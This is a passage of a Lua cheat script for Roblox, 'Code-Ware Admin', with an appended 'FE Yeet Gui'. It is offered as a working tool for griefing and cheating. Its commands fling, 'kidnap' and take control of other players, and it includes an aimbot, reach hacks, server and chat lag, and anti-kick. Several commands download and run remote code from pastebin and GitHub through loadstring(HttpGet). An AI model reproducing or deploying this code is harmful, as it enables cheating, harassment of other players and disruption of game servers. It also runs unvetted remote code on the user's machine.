        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.Angles(math.rad(-90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "You Are Currently Kidnapping "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".side" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.new(4,0.5,-1.5))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = target.Name.." Is Now Your Friend",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".robot" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.new(4.5,4,-1.5))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.new(4,0.5,-1.5))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.new(-0.5,4,-1.5))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Robot Active, Grab 3 Players For  A Full Robot",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".pet" then
    local target = getPlr(tostring(spaceSplit[2]):lower())
    local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
    if target == nil or tool == nil then return end
    tool.Handle.CanCollide = false
 
    getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(5,0,5)
    attachTool(tool,CFrame.new(5,-2.5,5) * CFrame.Angles(math.rad(-90),0,0))
    target.Character.Humanoid.PlatformStand = true
    firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
    firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Code-Ware Admin",
        Text = target.Name.." Is Now Your Pet",
        Icon = "rbxassetid://6238537240",
        Duration = 3,
    })
    elseif spaceSplit[1] == ".reach" then
        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
local amount = spaceSplit[2]
a=Instance.new("SelectionBox",tool.Handle)
a.Adornee=tool.Handle
tool.Handle.Size=Vector3.new(amount,amount,amount)
while true do
    tool.Handle.SelectionBox.Color3 = Color3.new(255/255,0/255,0/255)
     for i = 0,255,10 do
     wait()
     tool.Handle.SelectionBox.Color3 = Color3.new(255/255,i/255,0/255)
     end
      for i = 255,0,-10 do
      wait()
      tool.Handle.SelectionBox.Color3 = Color3.new(i/255,255/255,0/255)
      end
       for i = 0,255,10 do
       wait()
       tool.Handle.SelectionBox.Color3 = Color3.new(0/255,255/255,i/255)
       end
        for i = 255,0,-10 do
        wait()
        tool.Handle.SelectionBox.Color3 = Color3.new(0/255,i/255,255/255)
        end
         for i = 0,255,10 do
         wait()
         tool.Handle.SelectionBox.Color3 = Color3.new(i/255,0/255,255/255)
         end
         for i = 255,0,-10 do
         wait()
         tool.Handle.SelectionBox.Color3 = Color3.new(255/255,0/255,i/255)
         end
          end
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Reach Has Been Set To "..spaceSplit[2],
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
    elseif spaceSplit[1] == ".toilet" or spaceSplit[1] == ".chair" then
            loadstring(game:HttpGet("https://pastebin.com/raw/GTwpTdHR"))()
    elseif spaceSplit[1] == ".creeper" then
            loadstring(game:HttpGet("https://pastebin.com/raw/W6qRVuvZ"))()
    elseif spaceSplit[1] == ".fly" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Press P To Stop Flying",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        repeat wait()
        until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
    local mouse = game.Players.LocalPlayer:GetMouse()
    repeat wait() until mouse
    local plr = game.Players.LocalPlayer
    local torso = plr.Character.Torso
    local flying = true
    local deb = true
    local ctrl = {f = 0, b = 0, l = 0, r = 0}
    local lastctrl = {f = 0, b = 0, l = 0, r = 0}
    local maxspeed = 50
    local speed = 0
     
    function Fly()
    local bg = Instance.new("BodyGyro", torso)
    bg.P = 9e4
    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.cframe = torso.CFrame
    local bv = Instance.new("BodyVelocity", torso)
    bv.velocity = Vector3.new(0,0.1,0)
    bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
    repeat wait()
    plr.Character.Humanoid.PlatformStand = true
    if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
    speed = speed+.5+(speed/maxspeed)
    if speed > maxspeed then
    speed = maxspeed
    end
    elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
    speed = speed-1
    if speed < 0 then
    speed = 0
    end
    end
    if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
    lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
    elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
    else
    bv.velocity = Vector3.new(0,0.1,0)
    end
    bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
    until not flying
    ctrl = {f = 0, b = 0, l = 0, r = 0}
    lastctrl = {f = 0, b = 0, l = 0, r = 0}
    speed = 0
    bg:Destroy()
    bv:Destroy()
    plr.Character.Humanoid.PlatformStand = false
    end
    mouse.KeyDown:connect(function(key)
    if key:lower() == "p" then 
    flying = false
    Fly()
    elseif key:lower() == "w" then
    ctrl.f = 1
    elseif key:lower() == "s" then
    ctrl.b = -1
    elseif key:lower() == "a" then
    ctrl.l = -1
    elseif key:lower() == "d" then
    ctrl.r = 1
    end
    end)
    mouse.KeyUp:connect(function(key)
    if key:lower() == "w" then
    ctrl.f = 0
    elseif key:lower() == "s" then
    ctrl.b = 0
    elseif key:lower() == "a" then
    ctrl.l = 0
    elseif key:lower() == "d" then
    ctrl.r = 0
    end
    end)
    Fly()
    elseif spaceSplit[1] == ".aimbot" or spaceSplit[1] == ".aimlock" then
        local lplayer = game.Players.LocalPlayer
local mouse = lplayer:GetMouse()
local Current = game.Workspace.CurrentCamera
local GuiService = game:GetService("StarterGui")
local enabled = false
local aimbot = true
local aimat = 'Torso'
local Track = false
local User = game:GetService("UserInputService")

GuiService:SetCore("SendNotification", {Title = "Eagles Aimbot", Text = "Script Loaded", Icon = "rbxassetid://6238537240";})

function GetNearestPlayerToMouse()
local Users = {}
local lplayer_hold = {}
local Distances = {}
for i, v in pairs(game.Players:GetPlayers()) do
if v ~= lplayer then
table.insert(Users, v)
end
end
for i, v in pairs(Users) do
if aimbot == false then
if v and (v.Character) ~= nil and v.TeamColor ~= lplayer.TeamColor then
local aim = v.Character:FindFirstChild(aimat)
if aim ~= nil then
local Distance = (aim.Position - game.Workspace.CurrentCamera.CoordinateFrame.p).magnitude
local ray = Ray.new(game.Workspace.CurrentCamera.CoordinateFrame.p, (mouse.Hit.p - Current.CoordinateFrame.p).unit * Distance)
local hit,pos = game.Workspace:FindPartOnRay(ray, game.Workspace)
local diff = math.floor((pos - aim.Position).magnitude)
lplayer_hold[v.Name .. i] = {}
lplayer_hold[v.Name .. i].dist = Distance
lplayer_hold[v.Name .. i].plr = v
lplayer_hold[v.Name .. i].diff = diff
table.insert(Distances, diff)
end
end
elseif aimbot == true then
local aim = v.Character:FindFirstChild(aimat)
if aim ~= nil then
local Distance = (aim.Position - game.Workspace.CurrentCamera.CoordinateFrame.p).magnitude
local ray = Ray.new(game.Workspace.CurrentCamera.CoordinateFrame.p, (mouse.Hit.p - Current.CoordinateFrame.p).unit * Distance)
local hit,pos = game.Workspace:FindPartOnRay(ray, game.Workspace)
local diff = math.floor((pos - aim.Position).magnitude)
lplayer_hold[v.Name .. i] = {}
lplayer_hold[v.Name .. i].dist = Distance
lplayer_hold[v.Name .. i].plr = v
lplayer_hold[v.Name .. i].diff = diff
table.insert(Distances, diff)
end
end
end

if unpack(Distances) == nil then
return false
end

local L_Distance = math.floor(math.min(unpack(Distances)))
if L_Distance > 20 then
return false
end

for i, v in pairs(lplayer_hold) do
if v.diff == L_Distance then
return v.plr
end
end
return false
end

function Find()
Clear()
Track = true
spawn(function()
while wait() do
if Track then
Clear()
for i,v in pairs(game.Players:GetChildren()) do
if v.Character and v.Character:FindFirstChild('Head') then
if aimbot == false then
if v.TeamColor ~= lplayer.TeamColor then
if v.Character:FindFirstChild('Head') then
create(v.Character.Head, true)
end
end
else
if v.Character:FindFirstChild('Head') then
create(v.Character.Head, true)
end
end
end
end
end
end
wait(1)
end)
end

game:GetService('RunService').RenderStepped:connect(function()
if enabled then
local target = GetNearestPlayerToMouse()
if (target ~= false) then
local aim = target.Character:FindFirstChild(aimat)
if aim then
Current.CoordinateFrame = CFrame.new(Current.CoordinateFrame.p, aim.CFrame.p)
end

else

end
end
end)

mouse.KeyDown:connect(function(key)
if key == "x" then
if aimat == 'Head' then
aimat = 'Torso'
           GuiService:SetCore("SendNotification", {Title = "Eagles Aimbot", Text = "Aimbot now set to Torso",Icon = "rbxassetid://6238537240";})
elseif aimat == 'Torso' then
aimat = 'Head'
           GuiService:SetCore("SendNotification", {Title = "Eagles Aimbot", Text = "Aimbot now set to Head", Icon = "rbxassetid://6238537240";})
end
end
end)

User.InputBegan:Connect(function(inputObject)
   if(inputObject.KeyCode==Enum.KeyCode.Z) then
       enabled = true
   end
end)

User.InputEnded:Connect(function(inputObject)
   if(inputObject.KeyCode==Enum.KeyCode.Z) then
       enabled = false
   end
end)
    elseif spaceSplit[1] == ".antifling" then 
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game.GetService(game, Index)
    if NewService then
    Self[Index] = NewService
    end
    return NewService
    end})
    local LocalPlayer = Services.Players.LocalPlayer
    
    local function PlayerAdded(Player)
       local Detected = false
       local Character;
       local PrimaryPart;
    
       local function CharacterAdded(NewCharacter)
           Character = NewCharacter
           repeat
               wait()
               PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
           until PrimaryPart
           Detected = false
       end
    
       CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
       Player.CharacterAdded:Connect(CharacterAdded)
       Services.RunService.Heartbeat:Connect(function()
           if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
               if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                   if Detected == false then
                       game.StarterGui:SetCore("SendNotification", {
                       Title = "Eagles Anti-Fling",
                           Text = "Fling Detected, Player: " .. tostring(Player),
                           Icon = "rbxassetid://6238537240",
                Duration = 3,
                       })
                   end
                   Detected = true
                   for i,v in ipairs(Character:GetDescendants()) do
                       if v:IsA("BasePart") then
                           v.CanCollide = false
                           v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                           v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                           v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                       end
                   end
                   PrimaryPart.CanCollide = false
                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
               end
           end
       end)
    end
    
    -- // Event Listeners \\ --
    for i,v in ipairs(Services.Players:GetPlayers()) do
       if v ~= LocalPlayer then
           PlayerAdded(v)
       end
    end
    Services.Players.PlayerAdded:Connect(PlayerAdded)
    
    local LastPosition = nil
    Services.RunService.Heartbeat:Connect(function()
       pcall(function()
           local PrimaryPart = LocalPlayer.Character.PrimaryPart
           if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CFrame = LastPosition
    
               game.StarterGui:SetCore("SendNotification", {
               Title = "Eagles Anti-Fling",
                   Text = "You we're Flung, Neutralizing velocity",
                   Icon = "rbxassetid://6238537240",
                Duration = 3,
               })
           elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
               LastPosition = PrimaryPart.CFrame
           end
       end)
    end)
     game.StarterGui:SetCore("SendNotification", {
                       Title = "Eagles Anti-Fling",
                           Text = "Anti-Fling Active",
                           Icon = "rbxassetid://6238537240",
                Duration = 3,
                       })
    elseif spaceSplit[1] == ".rejoin" or spaceSplit[1] == ".rj" then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Rejoining game",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".r6" then
        loadstring(game:HttpGet("https://pastebin.com/raw/q7cgbyMW"))()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Switched to R6",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".serverhop" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Server hopping",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        local module = loadstring(game:HttpGet("https://pastebin.com/raw/wJ5Aapn5"))()
 
        module:Teleport(game.PlaceId)
    elseif spaceSplit[1] == ".cmds" then
        print([[
        
        C:\Users\]]..plr.Name..[[\Code-Ware\Admin.lua
        -------------------------------------------
        local Prefix = "."
        local Commands = {
            [*] = requires +1 tool
            *kill/void [target] -- Kills A Player
            *hold [target] -- Hold Someone Like The Hold In Grab Knife
            nolimbs/removelimbs -- Removes Limbs
            *bring [target] -- Brings A Player
            *bang [target] -- Sussifies A Player
            *carry [target] -- Hold Him And Smash Him On The Floor
            *pet [target] -- Walk Your Pet
            *side [target] -- Make Him Be Your Friend
            ***robot [target] -- Form A Robot
            *reach [target] -- Changes Sword Reach Can Be Given To Players
            autograbtools -- Auto Grab Workspace Tools
            stopgrabtools -- Stops Auto Grabbing Workspace Tools
            antikick -- Prevents Kick
            view [target] -- Views Target
            unview -- Stops Viewing Target
            update -- Updates The Script
            orbit [target] -- Spins Around Target
            freeze -- Freeze Your Character
            unfreeze -- Stop Freezing Your Character
            clicktp -- Enables Click Teleport
            mousetool -- Makes Tool Follow Mouse
            iq -- Says The Real IQ Of A Player
            aimbot/aimlock -- Activates A Bot's Aim
            antifling -- Prevents Skids From Flinging You
            r6 -- Switches Your Body Type To R6
            *control [target] -- Control A Player
            uncontrol -- Stop Controlling A Player
            clone -- Clone Illusion Might Hurt Your Eyes
            unclone -- Removes Clone Illusion
            *toolflingall -- Uses Tool Instead Of Body To Yeet Players
            loopflingall -- Repeats Yeet On Players
            fling [target] -- Yeets A Player
            fling2 [target] -- A Second Version Of Fling
            netlag/netsleep [target] -- Breaks Someones FE Script
            unnetlag/unnetsleep [target] -- Stop Breaking An FE Script
            goto/to [target] -- Teleport To A Player
            serverlag -- Lags The Server
            chatlag -- Lags Chat
            remotespam -- Spams Remote
            *kidnap -- Carry A Player On Your Back
            toilet/chair -- Make The Player Sit On You
            creeper -- Creeper Aw Man
            fly -- Fly Into The Air
            noclip/nc -- Sets Your Character's CanCollide To False
            clip/c -- Sets Your Character's CanCollide To True
            rejoin/rj -- Rejoin The Current Instance
            serverhop -- Switch The Current Instance
            respawn/re -- Resets Your Character But In Same Position
            *equiptools -- Equip All Your Tools
            hipheight/hh [number] --  Sets HipHeight To A Specific Value
            walkspeed/ws [number] -- Sets WalkSpeed To A Specific Value
            jumppower/jp [number] -- Setes JumpPower To A Specific Value
            *tp [target] [target] -- TP A Player To Another Player
            cmds -- Displays Commands
            info -- Displays Script Information
            endadmin/stopadmin/noadmin -- Disconnect The Script
        }
        -------------------------------------------
        ]])
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Commands Printed On Console",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".info" then
        print(">Code-Ware Admin_")
        print("Made by: Typx")
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Credits printed to Console",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".endadmin" or spaceSplit[1] == ".stopadmin" or spaceSplit[1] == ".noadmin" then
        cc:Disconnect()
        nsLoop:Disconnect()
        ncLoop:Disconnect()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Thanks For Using Code-Ware Admin, "..plr.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    end
end)
print(">Code-Ware Admin_")
print("Made by Typx")
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Welcome To Code-Ware, "..plr.Name,
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
local lp = game:FindService("Players").LocalPlayer

local function gplr(String)
	local Found = {}
	local strl = String:lower()
	if strl == "all" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			table.insert(Found,v)
		end
	elseif strl == "others" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name ~= lp.Name then
				table.insert(Found,v)
			end
		end 
	elseif strl == "me" then
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name == lp.Name then
				table.insert(Found,v)
			end
		end 
	else
		for i,v in pairs(game:FindService("Players"):GetPlayers()) do
			if v.Name:lower():sub(1, #String) == String:lower() then
				table.insert(Found,v)
			end
		end 
	end
	return Found 
end

local function notif(str,dur)
	game:FindService("StarterGui"):SetCore("SendNotification", {
		Title = "yeet gui",
		Text = str,
		Icon = "rbxassetid://2005276185",
		Duration = dur or 3
	})
end

--// sds

local h = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Top = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

h.Name = "h"
h.Parent = game:GetService("CoreGui")
h.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = h
Main.Active = true
Main.Draggable = true
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
Main.Size = UDim2.new(0, 454, 0, 218)
Main.Image = "rbxassetid://2005276185"

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(0, 454, 0, 44)

Title.Name = "Title"
Title.Parent = Top
Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0, 0, 0.295454562, 0)
Title.Size = UDim2.new(0, 454, 0, 30)
Title.Font = Enum.Font.SourceSans
Title.Text = "FE Yeet Gui (trollface edition)"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

TextBox.Parent = Main
TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
TextBox.Size = UDim2.new(0, 388, 0, 62)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Who do i destroy(can be shortened)"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
TextButton.Size = UDim2.new(0, 359, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Cheese em'"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextButton.MouseButton1Click:Connect(function()
	local Target = gplr(TextBox.Text)
	if Target[1] then
		Target = Target[1]
		
		local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
		Thrust.Force = Vector3.new(9999,999999,9999)
		Thrust.Name = "YeetForce"
		repeat
			lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
			Thrust.Location = Target.Character.HumanoidRootPart.Position
			lp.Character.Humanoid.Jump = true
game:FindService("RunService").Heartbeat:wait()
		until not Target.Character:FindFirstChild("Head")
	else
		notif("Invalid player")
	end
end)

--//fsddfsdf
notif("Loaded successfully! Created by scuba#0001", 5)

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/dex2.0", true))()
